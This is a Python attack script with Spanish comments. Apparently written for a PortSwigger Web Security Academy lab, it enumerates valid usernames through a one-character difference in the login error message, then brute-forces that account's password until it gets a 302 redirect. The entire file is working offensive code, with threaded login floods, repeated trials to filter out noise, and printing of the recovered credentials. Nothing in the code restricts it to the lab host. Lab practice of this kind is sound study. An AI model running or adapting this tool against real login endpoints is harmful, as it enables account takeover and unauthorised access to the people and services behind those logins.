#!/usr/bin/env python3
"""
Username enumeration + password brute-force con signal de byte-level differential.

Variante del bruteforce.py del lab anterior. Acá el server emite el mismo body
length para username válido vs inválido (incluyendo random noise tipo analytics
ID). La señal está en UN carácter del mensaje de error: el username válido tiene
"Invalid username or password " (espacio al final) en vez de
"Invalid username or password." (punto).

Por eso usamos como fingerprint el último char del warning message extraído del
HTML, no el length total. Para descartar noise (el lab tiene comentario HTML
aleatorio que aparece ~50% del tiempo), tomamos 3 trials por username y sólo
reportamos los que producen consistentemente el mismo signal anómalo.

Uso:
    python3 bruteforce.py <lab-host> <usernames-file> <passwords-file>
"""
import argparse
import re
import sys
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

WARNING_MSG_RE = re.compile(r'<p class=is-warning>(.*?)</p>', re.S)


def make_session() -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 auth-bruteforce-subtle",
    })
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503])
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_maxsize=64))
    return s


def attempt_login(session, host, username, password):
    body = urlencode({"username": username, "password": password})
    r = session.post(f"https://{host}/login", data=body, timeout=15, allow_redirects=False)
    msg_match = WARNING_MSG_RE.search(r.text)
    msg = msg_match.group(1) if msg_match else None
    return r.status_code, len(r.content), msg


def fingerprint_by_msg_suffix(msg: str | None) -> str:
    """Devuelve el último char del mensaje de warning, o '?' si no hay match."""
    if msg is None:
        return '?'
    return msg[-1] if msg else ''


def phase1_enum_username(session, host, usernames, dummy_pwd, workers, trials):
    print(f"\n[*] Fase 1 (enum usernames): probando {len(usernames)} candidatos x {trials} trials (workers={workers})...", file=sys.stderr)
    print(f"[*] signal: ultimo char del mensaje de warning (period vs espacio)", file=sys.stderr)

    def probe(u):
        signals = []
        for _ in range(trials):
            _, _, msg = attempt_login(session, host, u, dummy_pwd)
            signals.append(fingerprint_by_msg_suffix(msg))
        # consenso: el signal debe ser estable los 3 trials
        if len(set(signals)) == 1:
            return u, signals[0]
        return u, '!'  # inestable

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(probe, u): u for u in usernames}
        results = []
        for fut in as_completed(futures):
            results.append(fut.result())

    distribution = Counter(s for _, s in results)
    print(f"[*] distribucion de signals: {dict(distribution)}", file=sys.stderr)

    common = distribution.most_common(1)[0][0]
    candidates = [(u, s) for u, s in results if s != common and s != '!']
    return candidates


def phase2_bruteforce_password(session, host, valid_user, passwords, workers):
    print(f"\n[*] Fase 2 (brute pwd para {valid_user}): probando {len(passwords)} candidatos (workers={workers})...", file=sys.stderr)

    def probe(p):
        status, length, _ = attempt_login(session, host, valid_user, p)
        return p, status, length

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(probe, p): p for p in passwords}
        results = []
        for fut in as_completed(futures):
            results.append(fut.result())

    fingerprints = Counter((s, l) for _, s, l in results)
    common_fp = fingerprints.most_common(1)[0][0]
    print(f"[*] distribucion (status,length): top={fingerprints.most_common(3)}", file=sys.stderr)

    outliers = [(p, s, l) for p, s, l in results if (s, l) != common_fp]
    return outliers


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("host", help="lab host, ej. 0a1b....web-security-academy.net")
    p.add_argument("usernames_file", help="ruta a wordlist de usernames")
    p.add_argument("passwords_file", help="ruta a wordlist de passwords")
    p.add_argument("--workers", type=int, default=20)
    p.add_argument("--trials", type=int, default=3, help="trials por username en fase 1 para descartar noise")
    p.add_argument("--dummy-password", default="invalid_dummy_pwd")
    args = p.parse_args()

    with open(args.usernames_file) as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(args.passwords_file) as f:
        passwords = [line.strip() for line in f if line.strip()]

    session = make_session()

    candidates = phase1_enum_username(session, args.host, usernames, args.dummy_password, args.workers, args.trials)
    if not candidates:
        print("[!] no hay outlier estable en fase 1. revisar signal manualmente.", file=sys.stderr)
        return 1
    if len(candidates) > 1:
        print(f"[!] multiples outliers en fase 1 ({len(candidates)}):", file=sys.stderr)
        for u, s in candidates:
            print(f"    {u:<25} signal={s!r}", file=sys.stderr)
        print("[*] usando el primero", file=sys.stderr)
    valid_user, signal = candidates[0]
    print(f"\n[+] username valido: {valid_user}  (signal={signal!r})", file=sys.stderr)

    outliers = phase2_bruteforce_password(session, args.host, valid_user, passwords, args.workers)
    if not outliers:
        print("[!] no hay outlier en fase 2. password no esta en wordlist o response es uniforme.", file=sys.stderr)
        return 1

    # buscar el 302 (login exitoso) entre outliers
    redirects = [(p, s, l) for p, s, l in outliers if s == 302]
    if redirects:
        valid_pwd = redirects[0][0]
        print(f"[+] password valido: {valid_pwd}  (status=302)", file=sys.stderr)
        print(f"\n[+] credenciales: {valid_user}:{valid_pwd}")
        return 0
    else:
        print(f"[!] {len(outliers)} outliers pero ninguno con status=302. revisar:", file=sys.stderr)
        for p, s, l in outliers[:10]:
            print(f"    pwd={p!r:<20} status={s} len={l}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
